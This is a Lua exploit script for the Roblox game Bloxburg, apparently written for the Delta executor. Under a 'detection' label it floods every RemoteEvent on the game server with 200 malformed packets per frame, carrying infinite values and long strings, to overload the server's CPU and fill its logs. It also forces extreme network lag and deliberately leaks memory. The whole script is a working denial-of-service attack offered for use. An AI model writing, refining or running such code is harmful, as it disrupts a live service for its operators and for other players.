-- [[ BLOXBURG HIGH-DETECTION ENGINE: PURIFIED ]]
-- REMOVED: NEIGHBORHOOD JOINING / TELEPORTING
-- FOCUS: PACKET SATURATION & MEMORY CORRUPTION

print("Delta: Initiating Purified Detection Sequence...")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local NetworkSettings = settings().Network

-- 1. ENGINE LAG OVERRIDE
-- Setting this to a massive number creates an "Illegal" network state.
NetworkSettings.IncomingReplicationLag = 9999

-- 2. THE REMOTE "TSUNAMI"
-- This finds every single game remote and spams corrupt data tables.
task.spawn(function()
    local Remotes = {}
    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("UnreliableRemoteEvent") then 
            table.insert(Remotes, v) 
        end
    end

    while true do
        for _, remote in pairs(Remotes) do
            -- Spamming 200 packets per frame per remote
            for i = 1, 200 do
                pcall(function()
                    -- Sending math.huge (Infinity) and massive strings
                    -- This forces the server's CPU to spike while trying to 'read' the data.
                    remote:FireServer({
                        ["Status"] = "OVERLOAD_TEST",
                        ["Payload"] = math.huge,
                        ["CrashBuffer"] = string.rep("0", 1000)
                    })
                end)
            end
        end
        RunService.Heartbeat:Wait()
    end
end)

-- 3. THE "MEMORY LEAK" SIMULATOR
-- This rapidly fills your computer's RAM with useless data.
-- This causes the 'Heartbeat' (connection signal) to become unstable.
task.spawn(function()
    local LeakContainer = {}
    while true do
        for i = 1, 150000 do
            table.insert(LeakContainer, "SYNC_ERROR_DETECTION_STRING_" .. tick())
        end
        -- Artificial CPU Stall
        local start = tick()
        while tick() - start < 0.2 do end 
        task.wait()
    end
end)

print("Delta: V-MAX Active. Server logs are now filling with errors.")
